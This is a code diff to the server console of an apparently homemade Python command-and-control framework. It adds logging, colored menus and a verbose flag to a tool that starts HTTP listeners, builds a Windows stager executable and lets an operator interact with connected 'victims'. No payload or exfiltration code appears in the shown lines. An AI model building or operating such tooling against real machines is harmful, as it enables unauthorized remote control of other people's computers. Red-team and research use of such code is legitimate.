@@ -9,20 +9,31 @@ import os
 import shutil
 import subprocess
 import argparse
+from lib.logger import Logger
+from termcolor import colored
+import datetime
+import pathlib
+
+## Provides command history like bash to input
+import readline
 
 def parser():
 	parser = argparse.ArgumentParser(description='Python based C2')
 	
 	parser.add_argument('-g', '--generate', help = 'Generates exe', action='store_true')
+	parser.add_argument('-v', '--verbose', help = 'Generates exe', action='store_true')
 	args = parser.parse_args()
 	return args
 
 
 def display_main_help_menu():
+	print(' --------------------------------------')
+	print('|          SERVER HELP MENU            |')
+	print(' --------------------------------------')
 	commands = {'http':'Starts a new http listener.' , 'jobs': 'List existing http listener running.', 'kill': 'Kill the http listener running', 'generate': 'generates the stager in exe format in ./tmp folder', 'victims': 'Show the currently connected victims', 'use <VICTIM ID>' : 'Interact with connected victims','exit': 'exit the program.'}
 
 	for command in commands.keys():
-		print(command + " ---> " + commands[command])
+		print(colored(command,'cyan') + " - " + commands[command])
 
 def generate_stager():
 	## Convert to exe and save
@@ -36,23 +47,25 @@ def generate_stager():
 	subprocess.call('sudo docker run -v "$(pwd):/src/" cdrx/pyinstaller-windows', cwd=r"./tmp",shell=True)
 
 
-def main(db_object):
-	args = parser()
+def main(args,db_object,server_logger):
 	myclient = db_object.mongoclient
 
 	if args.generate:
 		## Import stager code and convert to exe
 		generate_stager()
 
+	display_main_help_menu()
+	print()
+	
 	while True:
-		print("Enter command:")
+		print(colored("Enter server commands",'blue'))
 		cmd = str(input())
 
 		if cmd == 'http':
 			h = Listener(port="8080")
 			
 			h.start_listener()
-			print("Started http listener.")
+			server_logger.info_log("Started http listener.",'green')
 
 		elif cmd == 'listeners':
 			Listener.show_listeners()
@@ -81,13 +94,13 @@ def main(db_object):
 			matched = list(filter(r.match, Victim.victims.keys()))
 
 			if len(matched) == 0 :
-				print("No victims found with that ID")
+				server_logger.info_log("No victims found with that ID",'yellow')
 			elif len(matched) == 1 :
 				victim_id = matched[0]
-				print(f"Interacting with {victim_id}")
+				server_logger.info_log(f"Interacting with {victim_id}",'green')
 				Victim.victims[victim_id].victim_menu()
 			else:
-				print("Multiple victims found, Please provide full or unique ID.")
+				server_logger.info_log("Multiple victims found, Please provide full or unique ID.",'yellow')
 
 
 		elif cmd == 'help':
@@ -98,17 +111,31 @@ def main(db_object):
 			db_object.drop_db()
 			break
 
-if __name__=="__main__":
+		print()
 
-	db_object = Database(url="mongodb://localhost:27017/")
+
+
+if __name__=="__main__":
+	args = parser()
+	db_url = "mongodb://localhost:27017/"
+
+	## Setting up logging
+	server_logger = Logger(logdir='logs',logfile='logs',verbose=args.verbose )
+	server_logger.setup()
+
+	## launches the log in new screen
+	server_logger.launch_logs_screen()
+	
+
+	server_logger.info_log(f"Initiated database connection from main- {db_url}",'green')
+
+	db_object = Database(url=db_url)
 	Listener.mongoclient = db_object.mongoclient
 	Victim.mongoclient = db_object.mongoclient
 	Task.mongoclient = db_object.mongoclient
 
-	
-
 	try:
-		main(db_object)
+		main(args,db_object,server_logger)
 	except KeyboardInterrupt:
 		Listener.kill_all_listeners()
 		db_object.drop_db()
